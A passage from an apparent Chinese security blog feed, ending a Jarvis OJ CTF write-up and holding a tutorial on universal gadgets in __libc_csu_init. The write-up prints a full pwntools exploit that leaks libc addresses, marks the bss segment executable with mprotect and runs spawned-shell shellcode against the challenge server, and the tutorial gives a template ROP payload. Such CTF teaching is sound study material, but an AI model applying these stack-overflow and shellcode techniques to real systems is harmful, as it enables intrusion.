id="font-color-navy1泄露write的真实地址font"><a class="markdownIt-Anchor" href="#font-color-navy1泄露write的真实地址font"></a> <font color="navy"><code>1.泄露write的真实地址</code></font></h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! python3</span></span><br><span class="line"><span class="comment">#! /usr/bin/env python</span></span><br><span class="line"><span class="comment">#! coding: utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">r = remote(<span class="string">"pwn2.jarvisoj.com"</span>,<span class="number">9884</span>)</span><br><span class="line">context(log_level=<span class="string">"debug"</span>)</span><br><span class="line">elf = ELF(<span class="string">"./level3_x64"</span>)</span><br><span class="line">write_plt = elf.symbols[<span class="string">"write"</span>]</span><br><span class="line">write_got = elf.got[<span class="string">"write"</span>]</span><br><span class="line">read_got = elf.got[<span class="string">'read'</span>]</span><br><span class="line">main = elf.symbols[<span class="string">"main"</span>]</span><br><span class="line">bss = elf.bss()</span><br><span class="line">pop_rdi = <span class="number">0x4006b3</span></span><br><span class="line">pop_rsi_r15 = <span class="number">0x4006b1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># leak write real address </span></span><br><span class="line">payload1 = bytes(<span class="number">0x88</span> * <span class="string">"a"</span>,encoding=<span class="string">"unicode_escape"</span>)</span><br><span class="line">payload1 += p64(pop_rdi) + p64(<span class="number">1</span>) + p64(pop_rsi_r15) + p64(write_got) + p64(<span class="number">1</span>)</span><br><span class="line">payload1 += p64(write_plt) + p64(main)</span><br><span class="line">print(<span class="string">"[*] +-+-+-+-+-+-+-+- sending payload1 -+-+-+-+-+-+-+-+ [*]"</span>)</span><br><span class="line">r.recvuntil(<span class="string">"Input:\n"</span>)</span><br><span class="line">r.sendline(payload1)</span><br><span class="line">write_addr = u64(r.recv()[:<span class="number">8</span>])</span><br><span class="line">print(<span class="string">"[+] write real addr:"</span>,hex(write_addr))</span><br><span class="line">print(<span class="string">"[*] +-+-+-+-+-+-+-+- Congratulation! You haved leaked the address of write -+-+-+-+-+-+-+-+ [*]"</span>)</span><br></pre></td></tr></table></figure><blockquote><p>发送完payload1后，栈中的情况如下：</p></blockquote><p><img src="/images/129-4.png" alt></p><h4 id="font-color-navy2找出mprotect真实地址font"><a class="markdownIt-Anchor" href="#font-color-navy2找出mprotect真实地址font"></a> <font color="navy"><code>2.找出mprotect真实地址</code></font></h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># get mprotect address </span></span><br><span class="line">libc = LibcSearcher(<span class="string">"write"</span>,write_addr)</span><br><span class="line">libc_base = write_addr - libc.dump(<span class="string">"write"</span>)</span><br><span class="line">mprotect = libc_base + libc.dump(<span class="string">"mprotect"</span>)</span><br><span class="line">print(<span class="string">"[+] mprotect address:"</span>,mprotect)</span><br></pre></td></tr></table></figure><h4 id="font-color-navy3将mprotect函数地址和shellcode写入bssfont"><a class="markdownIt-Anchor" href="#font-color-navy3将mprotect函数地址和shellcode写入bssfont"></a> <font color="navy"><code>3.将mprotect函数地址和shellcode写入bss</code></font></h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># rop1 and rop2</span></span><br><span class="line">rop1 = <span class="number">0x4006aa</span></span><br><span class="line">rop2 = <span class="number">0x400690</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># write shellcode to bss</span></span><br><span class="line">shellcode = p64(mprotect) + asm(shellcraft.amd64.sh(),arch=<span class="string">"amd64"</span>)</span><br><span class="line">payload2 = bytes(<span class="number">0x88</span>*<span class="string">"a"</span>,encoding=<span class="string">"unicode_escape"</span>) + p64(rop1) </span><br><span class="line">payload2 += p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(read_got)</span><br><span class="line">payload2 += p64(<span class="number">0x600000</span>) + p64(bss) + p64(<span class="number">0</span>)</span><br><span class="line">payload2 += p64(rop2) + bytes(<span class="string">"a"</span>*<span class="number">56</span>,encoding=<span class="string">"unicode_escape"</span>) + p64(main)</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">r.sendline(payload2)</span><br><span class="line">r.sendline(shellcode)</span><br><span class="line">print(<span class="string">"[*] +-+-+-+-+-+-+-+- sending payload2 -+-+-+-+-+-+-+-+-+ [*]"</span>)</span><br></pre></td></tr></table></figure><blockquote><p>发送完<code>payload2</code>后，栈中的情况如下：</p></blockquote><p><img src="/images/129-5.png" alt></p><h4 id="font-color-navy4将bss的权限改为可执行并返回shellcodefont"><a class="markdownIt-Anchor" href="#font-color-navy4将bss的权限改为可执行并返回shellcodefont"></a> <font color="navy"><code>4.将bss的权限改为可执行，并返回shellcode</code></font></h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># mprotect bss 7</span></span><br><span class="line">payload3 = bytes(<span class="number">0x88</span>*<span class="string">"a"</span>,encoding=<span class="string">"unicode_escape"</span>) + p64(rop1)</span><br><span class="line">payload3 += p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(bss)</span><br><span class="line">payload3 += p64(<span class="number">7</span>) + p64(<span class="number">0x1000</span>) + p64(<span class="number">0x600000</span>)</span><br><span class="line">payload3 += p64(rop2) + bytes(<span class="string">"a"</span>*<span class="number">56</span>,encoding=<span class="string">"unicode_escape"</span>) + p64(bss+<span class="number">8</span>)</span><br><span class="line">pause()</span><br><span class="line">r.sendlineafter(<span class="string">"Input:\n"</span>,payload3)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><blockquote><p>发送完<code>payload3</code>后，栈中的情况如下：</p></blockquote><p><img src="/images/129-6.png" alt></p><blockquote><p>完整的exp如下：</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! python3</span></span><br><span class="line"><span class="comment">#! /usr/bin/env python</span></span><br><span class="line"><span class="comment">#! coding: utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">r = remote(<span class="string">"pwn2.jarvisoj.com"</span>,<span class="number">9884</span>)</span><br><span class="line">context(log_level=<span class="string">"debug"</span>)</span><br><span class="line">elf = ELF(<span class="string">"./level3_x64"</span>)</span><br><span class="line">write_plt = elf.symbols[<span class="string">"write"</span>]</span><br><span class="line">write_got = elf.got[<span class="string">"write"</span>]</span><br><span class="line">read_got = elf.got[<span class="string">'read'</span>]</span><br><span class="line">main = elf.symbols[<span class="string">"main"</span>]</span><br><span class="line">bss = elf.bss()</span><br><span class="line">pop_rdi = <span class="number">0x4006b3</span></span><br><span class="line">pop_rsi_r15 = <span class="number">0x4006b1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># leak write real address </span></span><br><span class="line">payload1 = bytes(<span class="number">0x88</span> * <span class="string">"a"</span>,encoding=<span class="string">"unicode_escape"</span>)</span><br><span class="line">payload1 += p64(pop_rdi) + p64(<span class="number">1</span>) + p64(pop_rsi_r15) + p64(write_got) + p64(<span class="number">1</span>)</span><br><span class="line">payload1 += p64(write_plt) + p64(main)</span><br><span class="line">print(<span class="string">"[*] +-+-+-+-+-+-+-+- sending payload1 -+-+-+-+-+-+-+-+ [*]"</span>)</span><br><span class="line">r.recvuntil(<span class="string">"Input:\n"</span>)</span><br><span class="line">r.sendline(payload1)</span><br><span class="line">write_addr = u64(r.recv()[:<span class="number">8</span>])</span><br><span class="line">print(<span class="string">"[+] write real addr:"</span>,hex(write_addr))</span><br><span class="line">print(<span class="string">"[*] +-+-+-+-+-+-+-+- Congratulation! You haved leaked the address of write -+-+-+-+-+-+-+-+ [*]"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># get mprotect address </span></span><br><span class="line">libc = LibcSearcher(<span class="string">"write"</span>,write_addr)</span><br><span class="line">libc_base = write_addr - libc.dump(<span class="string">"write"</span>)</span><br><span class="line">mprotect = libc_base + libc.dump(<span class="string">"mprotect"</span>)</span><br><span class="line">print(<span class="string">"[+] mprotect address:"</span>,mprotect)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># rop1 and rop2</span></span><br><span class="line">rop1 = <span class="number">0x4006aa</span></span><br><span class="line">rop2 = <span class="number">0x400690</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># write shellcode to bss</span></span><br><span class="line">shellcode = p64(mprotect) + asm(shellcraft.amd64.sh(),arch=<span class="string">"amd64"</span>)</span><br><span class="line">payload2 = bytes(<span class="number">0x88</span>*<span class="string">"a"</span>,encoding=<span class="string">"unicode_escape"</span>) + p64(rop1) </span><br><span class="line">payload2 += p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(read_got)</span><br><span class="line">payload2 += p64(<span class="number">0x600000</span>) + p64(bss) + p64(<span class="number">0</span>)</span><br><span class="line">payload2 += p64(rop2) + bytes(<span class="string">"a"</span>*<span class="number">56</span>,encoding=<span class="string">"unicode_escape"</span>) + p64(main)</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">r.sendline(payload2)</span><br><span class="line">r.sendline(shellcode)</span><br><span class="line">print(<span class="string">"[*] +-+-+-+-+-+-+-+- sending payload2 -+-+-+-+-+-+-+-+-+ [*]"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># mprotect bss 7</span></span><br><span class="line">payload3 = bytes(<span class="number">0x88</span>*<span class="string">"a"</span>,encoding=<span class="string">"unicode_escape"</span>) + p64(rop1)</span><br><span class="line">payload3 += p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(bss)</span><br><span class="line">payload3 += p64(<span class="number">7</span>) + p64(<span class="number">0x1000</span>) + p64(<span class="number">0x600000</span>)</span><br><span class="line">payload3 += p64(rop2) + bytes(<span class="string">"a"</span>*<span class="number">56</span>,encoding=<span class="string">"unicode_escape"</span>) + p64(bss+<span class="number">8</span>)</span><br><span class="line">pause()</span><br><span class="line">r.sendlineafter(<span class="string">"Input:\n"</span>,payload3)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;img src=&quot;/images/129-1.jpg&quot; alt&gt;&lt;/p&gt;
&lt;h3 id=&quot;font-color-brown0x00-相关知识font&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#font-color-brown0x00-相关知
      
    
    </summary>
    
    
      <category term="pwn" scheme="https://muzibing.github.io/tags/pwn/"/>
    
      <category term="Jarvis" scheme="https://muzibing.github.io/tags/Jarvis/"/>
    
      <category term="栈溢出" scheme="https://muzibing.github.io/tags/%E6%A0%88%E6%BA%A2%E5%87%BA/"/>
    
  </entry>
  
  <entry>
    <title>&lt;_libc_csu_init&gt;中的“通用gadget”</title>
    <link href="https://muzibing.github.io/2020/06/17/2020.06.17%EF%BC%88128%EF%BC%89/"/>
    <id>https://muzibing.github.io/2020/06/17/2020.06.17（128）/</id>
    <published>2020-06-17T05:29:24.307Z</published>
    <updated>2020-06-17T11:12:23.126Z</updated>
    
    <content type="html"><![CDATA[<h3 id="font-color-brown0x00-基础知识font"><a class="markdownIt-Anchor" href="#font-color-brown0x00-基础知识font"></a> <font color="brown"><code>0x00 基础知识</code></font></h3><h4 id="font-color-navy1x86和x64的传参方式font"><a class="markdownIt-Anchor" href="#font-color-navy1x86和x64的传参方式font"></a> <font color="navy"><code>1.x86和x64的传参方式</code></font></h4><p>      由于X64和X86的传参的方式不同：X86是将参数入栈进行传参，X64则是将前6位参数分别通过寄存器<code>rdi</code>、<code>rsi</code>、<code>rdx</code>、<code>rcx</code>、<code>r8</code>和<code>r9</code>进行传递，之后的参数才是通过入栈的形式进行传参，下面通过一个示例程序进行描述，程序如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># <span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">fun</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b, <span class="keyword">int</span> c, <span class="keyword">int</span> d, <span class="keyword">int</span> e, <span class="keyword">int</span> f, <span class="keyword">int</span> g ,<span class="keyword">int</span> h ,<span class="keyword">int</span> i)</span></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"a:%d\tb:%d\tc:%d\td:%d\te:%d\tf:%d\tg:%d\th:%d\ti:%d\t"</span>,a,b,c,d,e,f,g,h,i);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a=<span class="number">100</span>,b=<span class="number">101</span>,c=<span class="number">102</span>,d=<span class="number">103</span>,e=<span class="number">104</span>,f=<span class="number">105</span>,g=<span class="number">106</span>,h=<span class="number">107</span>,i=<span class="number">108</span>; # 十六进制分别为<span class="number">0x64</span>、<span class="number">0x65</span>、<span class="number">0x66</span>、<span class="number">0x67</span>、<span class="number">0x68</span>、<span class="number">0x69</span>、<span class="number">0x6a</span>、<span class="number">0x6b</span>、<span class="number">0x6c</span>、</span><br><span class="line">    fun(a,b,c,d,e,f,g,h,i);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>x86的传参情况</code></p><p><img src="/images/128-1.png" alt></p><blockquote><p>从上图可以看出在<code>x86</code>下<code>fun</code>函数的参数是通过入栈的形式进行传递的</p></blockquote><p><code>x64的传参情况</code></p><p><img src="/images/128-2.jpg" alt></p><blockquote><p>从上图可以看出在<code>x64</code>下<code>fun</code>函数的前6个参数是通过寄存器<code>rdi</code>、<code>rsi</code>、<code>rdx</code>、<code>rcx</code>、<code>r8</code>和<code>r9</code>进行传递，后面的3个函数则是通过入栈的方式</p></blockquote><h4 id="font-color-navy2gadgetfont"><a class="markdownIt-Anchor" href="#font-color-navy2gadgetfont"></a> <font color="navy"><code>2.gadget</code></font></h4><p>      由于x64下函数的前6个参数是通过寄存器<code>rdi</code>、<code>rsi</code>、<code>rdx</code>、<code>rcx</code>、<code>r8</code>和<code>r9</code>进行传递的，所以我们需要一些类似于<code>pop rdi; ret</code>指令来改变这些寄存器的值，来满足我们的需求，而这些指令被称为<code>gadget</code>。</p><p><code>参数个数：1-2个</code></p><p>      当函数的参数比较少时，我们可以在程序中搜索一些简单的gadget指令，其中查找gadget的著名工具有：</p><blockquote><p><strong>ROPEME</strong>: <a href="https://github.com/packz/ropeme" target="_blank" rel="noopener">https://github.com/packz/ropeme</a></p><p><strong>Ropper</strong>: <a href="https://github.com/sashs/Ropper" target="_blank" rel="noopener">https://github.com/sashs/Ropper</a></p><p><strong>ROPgadget</strong>: <a href="https://github.com/JonathanSalwan/ROPgadget/tree/master" target="_blank" rel="noopener">https://github.com/JonathanSa…</a></p><p><strong>rp++</strong>: <a href="https://github.com/0vercl0k/rp" target="_blank" rel="noopener">https://github.com/0vercl0k/rp</a></p></blockquote><p>      如下图：（使用工具为<code>ROPgadget</code>）</p><p><img src="/images/128-3.png" alt></p><p><code>参数个数：3个</code></p><p>      在上图中我们没有发现可以改变第3个参数的gadget指令（<code>pop rdx;ret</code>），那么我们就无法再控制指令了。因为程序在编译过程中会加入一些通用函数用来进行初始化操作（比如加载libc.so的初始化函数），所以虽然很多程序的源码不同，但是初始化的过程是相同的，因此针对这些初始化函数，我们可以提取一些通用的gadgets加以使用，从而达到我们想要达到的效果。<sup>[1]</sup>下文会对通用函数<code>__libc_csu_init</code>中的gadget进行详细解释。一般来说，<a href="http://xn--libc-ps5fo9z9mtkk5bwgj322b30f.so" target="_blank" rel="noopener">只要程序调用了libc.so</a>，程序都会有这个函数用来对libc进行初始化操作。</p><h3 id="font-color-brown0x01-__libc_csu_init源码font"><a class="markdownIt-Anchor" href="#font-color-brown0x01-__libc_csu_init源码font"></a> <font color="brown"><code>0X01 __libc_csu_init源码</code></font></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">00000000004011d0 &lt;__libc_csu_init&gt;:</span><br><span class="line">  4011d0:       41 57                   push   %r15</span><br><span class="line">  4011d2:       4c 8d 3d 37 2c 00 00    lea    0x2c37(%rip),%r15        # 403e10 &lt;__frame_dummy_init_array_entry&gt;</span><br><span class="line">  4011d9:       41 56                   push   %r14</span><br><span class="line">  4011db:       49 89 d6                mov    %rdx,%r14</span><br><span class="line">  4011de:       41 55                   push   %r13</span><br><span class="line">  4011e0:       49 89 f5                mov    %rsi,%r13</span><br><span class="line">  4011e3:       41 54                   push   %r12</span><br><span class="line">  4011e5:       41 89 fc                mov    %edi,%r12d</span><br><span class="line">  4011e8:       55                      push   %rbp</span><br><span class="line">  4011e9:       48 8d 2d 28 2c 00 00    lea    0x2c28(%rip),%rbp        # 403e18 &lt;__do_global_dtors_aux_fini_array_entry&gt;</span><br><span class="line">  4011f0:       53                      push   %rbx</span><br><span class="line">  4011f1:       4c 29 fd                sub    %r15,%rbp</span><br><span class="line">  4011f4:       48 83 ec 08             sub    $0x8,%rsp</span><br><span class="line">  4011f8:       e8 03 fe ff ff          callq  401000 &lt;_init&gt;</span><br><span class="line">  4011fd:       48 c1 fd 03             sar    $0x3,%rbp</span><br><span class="line">  401201:       74 1b                   je     40121e &lt;__libc_csu_init+0x4e&gt;</span><br><span class="line">  401203:       31 db                   xor    %ebx,%ebx</span><br><span class="line">  401205:       0f 1f 00                nopl   (%rax)</span><br><span class="line">  401208:       4c 89 f2                mov    %r14,%rdx</span><br><span class="line">  40120b:       4c 89 ee                mov    %r13,%rsi</span><br><span class="line">  40120e:       44 89 e7                mov    %r12d,%edi</span><br><span class="line">  401211:       41 ff 14 df             callq  *(%r15,%rbx,8)</span><br><span class="line">  401215:       48 83 c3 01             add    $0x1,%rbx</span><br><span class="line">  401219:       48 39 dd                cmp    %rbx,%rbp</span><br><span class="line">  40121c:       75 ea                   jne    401208 &lt;__libc_csu_init+0x38&gt;</span><br><span class="line">  40121e:       48 83 c4 08             add    $0x8,%rsp</span><br><span class="line">  401222:       5b                      pop    %rbx</span><br><span class="line">  401223:       5d                      pop    %rbp</span><br><span class="line">  401224:       41 5c                   pop    %r12</span><br><span class="line">  401226:       41 5d                   pop    %r13</span><br><span class="line">  401228:       41 5e                   pop    %r14</span><br><span class="line">  40122a:       41 5f                   pop    %r15</span><br><span class="line">  40122c:       c3                      retq   </span><br><span class="line">  40122d:       0f 1f 00                nopl   (%rax)</span><br></pre></td></tr></table></figure><blockquote><p>我们将上述程序简化一下，并分为两个部分：</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"># part 1</span><br><span class="line">  401208:       4c 89 f2                mov    %r14,%rdx</span><br><span class="line">  40120b:       4c 89 ee                mov    %r13,%rsi</span><br><span class="line">  40120e:       44 89 e7                mov    %r12d,%edi</span><br><span class="line">  401211:       41 ff 14 df             callq  *(%r15,%rbx,8)</span><br><span class="line">  401215:       48 83 c3 01             add    $0x1,%rbx</span><br><span class="line">  401219:       48 39 dd                cmp    %rbx,%rbp</span><br><span class="line">  40121c:       75 ea                   jne    401208 &lt;__libc_csu_init+0x38&gt;</span><br><span class="line">  40121e:       48 83 c4 08             add    $0x8,%rsp</span><br><span class="line">  401222:       5b                      pop    %rbx</span><br><span class="line">  401223:       5d                      pop    %rbp</span><br><span class="line">  401224:       41 5c                   pop    %r12</span><br><span class="line">  401226:       41 5d                   pop    %r13</span><br><span class="line">  401228:       41 5e                   pop    %r14</span><br><span class="line">  40122a:       41 5f                   pop    %r15</span><br><span class="line">  40122c:       c3                      retq   </span><br><span class="line">  </span><br><span class="line"># part 2</span><br><span class="line">  401222:       5b                      pop    %rbx</span><br><span class="line">  401223:       5d                      pop    %rbp</span><br><span class="line">  401224:       41 5c                   pop    %r12</span><br><span class="line">  401226:       41 5d                   pop    %r13</span><br><span class="line">  401228:       41 5e                   pop    %r14</span><br><span class="line">  40122a:       41 5f                   pop    %r15</span><br><span class="line">  40122c:       c3                      retq</span><br></pre></td></tr></table></figure><blockquote><p>从位于地址<code>401208</code>到<code>40120e</code>的指令，可以看出：</p><ul><li><code>r14</code> ----&gt; <code>rdx</code> ： <code>arg3</code></li><li><code>r13</code> ----&gt; <code>rsi</code> ： <code>arg2</code></li><li><code>r12</code> ----&gt; <code>rdi</code> ： <code>arg1</code></li></ul><p>我们可以看到利用<code>401222</code>处的代码我们可以控制<code>rbx,rbp,r12,r13,r14和r15</code>的值，随后利用<code>401208</code>处的代码我们将r15的值赋值给<code>rdx</code>,<code>r14</code>的值赋值给<code>rsi</code>,<code>r13</code>的值赋值给<code>edi</code>，随后就会调用<code>call qword ptr [r12+rbx*8]</code>。这时候我们只要再将<code>rbx</code>的值赋值为<code>0</code>，再通过精心构造栈上的数据，我们就可以控制<code>pc</code>去调用我们想要调用的函数了（比如说write函数）。执行完<code>call qword ptr [r12+rbx*8]</code>之后，程序会对<code>rbx+=1</code>，然后对比<code>rbp</code>和<code>rbx</code>的值，如果相等就会继续向下执行并<code>ret</code>到我们想要继续执行的地址。所以为了让<code>rbp</code>和<code>rbx</code>的值相等，我们可以将rbp的值设置为1，因为之前已经将rbx的值设置为0了。大概思路就是这样，我们下来构造ROP链。<strong>注意我们的gadget是<code>call qword ptr [r12+rbx*8]</code>，所以我们应该使用<code>write.got</code>的地址而不是<code>write.plt</code>的地址</strong>。</p></blockquote><h3 id="font-color-brown0x02-通用gadget在栈中的情况font"><a class="markdownIt-Anchor" href="#font-color-brown0x02-通用gadget在栈中的情况font"></a> <font color="brown"><code>0X02 通用gadget在栈中的情况</code></font></h3><p>     我们先来推导一下上述代码运行时，栈中的变化，这里要注意的是我们须先执行<code>part2</code>部分的指令，然后再执行<code>part1</code>的指令，假设我们栈中是下图情况（存在栈溢出漏洞）</p><p><img src="/images/128-4.png" alt></p><p>      现在我们构造payload，根据栈中的情况：</p><blockquote><ul><li><code>return address</code>处应该是<code>part2</code>的入口地址</li><li>执行<code>part2</code>中的指令，这时esp指向<code>return address</code></li><li>6 个 <code>pop</code> 语句，依次将栈顶的数据赋值给寄存器<code>rbx</code>、<code>rbp</code>、<code>r12</code>、<code>r13</code>、<code>r14</code>、<code>r15</code></li><li>1 个 <code>ret</code> 语句，此时esp执行的时r15对应栈顶的位置+8</li></ul><p>则我们构造payload如下：</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">payload = padding + <span class="string">"a"</span>*<span class="number">8</span><span class="comment"># 填充部分和old ebp部分</span></span><br><span class="line">payload += p64(part2)</span><br><span class="line">payload += p64(<span class="number">0</span>)<span class="comment"># rbx = 0，因为401211处的callq  *(%r15,%rbx,8)，我们要将r15的值为调用函数的地址</span></span><br><span class="line">payload += p64(<span class="number">1</span>)<span class="comment"># rbp = 1，因为401219处的cmp    %rbx,%rbp，这里必须要使得rbx和rbp相等，因为我们将rbx设置为0，而在401215处将rbx进行加1，所以这里rbp的值也要为1</span></span><br><span class="line">payload += p64(arg1)<span class="comment"># r12 = arg1</span></span><br><span class="line">payload += p64(arg2)<span class="comment"># r13 = arg2</span></span><br><span class="line">payload += p64(arg3)<span class="comment"># r14 = arg3</span></span><br><span class="line">payload += p64(function_got_addr)<span class="comment"># r15 = function_got_addr</span></span><br><span class="line">payload += p64(part1)<span class="comment"># return --&gt; part1</span></span><br><span class="line">payload += <span class="string">"a"</span>*<span class="number">56</span><span class="comment"># 6个pop指令 + add  $0x8,%rsp语句</span></span><br><span class="line">payload += p64(return_address)<span class="comment"># 返回到指定地址</span></span><br></pre></td></tr></table></figure><blockquote><p>上述payload在栈中的执行情况如下：</p></blockquote><p><img src="/images/128-5.gif" alt></p><p><a href="/pdf/128-5.pdf">点击下载上述过程文件</a></p><blockquote><p>要说明的是，这里的payload并不是固定的，要根据程序的实际情况来定</p></blockquote><h3 id="font-color-brown0x05-其他通用函数font"><a class="markdownIt-Anchor" href="#font-color-brown0x05-其他通用函数font"></a> <font color="brown"><code>0x05 其他通用函数</code></font></h3><p>除了上面介绍的 <code>__libc_csu_init()</code>，还可以到下面的函数中找一找：<sup>[2]</sup></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">_init</span><br><span class="line">_start</span><br><span class="line">call_gmon_start</span><br><span class="line">deregister_tm_clones</span><br><span class="line">register_tm_clones</span><br><span class="line">__do_global_dtors_aux</span><br><span class="line">frame_dummy</span><br><span class="line">__libc_csu_init</span><br><span class="line">__libc_csu_fini</span><br><span class="line">_fini</span><br></pre></td></tr></table></figure><h3 id="font-color-brown0x04-referencefont"><a class="markdownIt-Anchor" href="#font-color-brown0x04-referencefont"></a> <font color="brown"><code>0x04 Reference</code></font></h3><p>[1] <a href="https://segmentfault.com/a/1190000007406442" target="_blank" rel="noopener">一步一步学ROP之linux_x64篇</a></p><p>[2] 